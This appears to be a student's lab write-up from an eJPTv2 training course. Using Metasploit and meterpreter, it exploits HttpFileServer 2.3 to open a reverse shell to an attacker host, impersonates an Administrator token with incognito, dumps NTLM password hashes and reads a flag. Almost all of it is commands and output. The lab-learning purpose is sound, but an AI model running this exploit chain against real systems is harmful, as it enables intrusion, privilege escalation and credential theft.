---
up: "[[4. ARCHIVES/eJPTv2/Host & Network Penetration Testing/System - Host Based Attacks/Windows Privilege Escalation/Windows Privilege Escalation]]"
---

# 🧪 Privilege Escalation Impersonate

## Overview

This lab covers the process of impersonating access tokens on Windows with meterpreter's in-built *Incognito* module.

## Solution

10.2.20.54

```bash
nmap -sV -p- -T5 10.2.20.54
Starting Nmap 7.91 ( https://nmap.org ) at 2024-03-26 19:18 IST
Nmap scan report for 10.2.20.54
Host is up (0.0029s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          HttpFileServer httpd 2.3
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.07 seconds
```

```bash
$ msfconsole -q
msf6 > use exploit/windows/http/rejetto_hfs_exec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```

```bash
msf6 exploit(windows/http/rejetto_hfs_exec) > setg RHOSTS 10.2.20.54
RHOSTS => 10.2.20.54
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.11.2:4444 
[*] Using URL: http://0.0.0.0:8080/Pws1PIscwJAqqj
[*] Local IP: http://10.10.11.2:8080/Pws1PIscwJAqqj
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /Pws1PIscwJAqqj
[*] Sending stage (175174 bytes) to 10.2.20.54
[!] Tried to delete %TEMP%\opnlbqy.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.11.2:4444 -> 10.2.20.54:49759) at 2024-03-26 19:22:40 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows
meterpreter >
```

```bash
meterpreter > load incognito
Loading extension incognito...Success.
```

```bash
meterpreter > list_tokens -u
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
ATTACKDEFENSE\Administrator
NT AUTHORITY\LOCAL SERVICE

Impersonation Tokens Available
========================================
No tokens available
```

```bash
meterpreter > impersonate_token "ATTACKDEFENSE\Administrator"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user ATTACKDEFENSE\Administrator
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
meterpreter > pgrep explorer
3696
meterpreter > migrate 3696
[*] Migrating from 5052 to 3696...
[*] Migration completed successfully.
meterpreter > getuid
Server username: ATTACKDEFENSE\Administrator
```

```bash
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```

```bash
meterpreter > cat flag.txt
x28c832a39730b7d46d6c38f1ea18e12
```
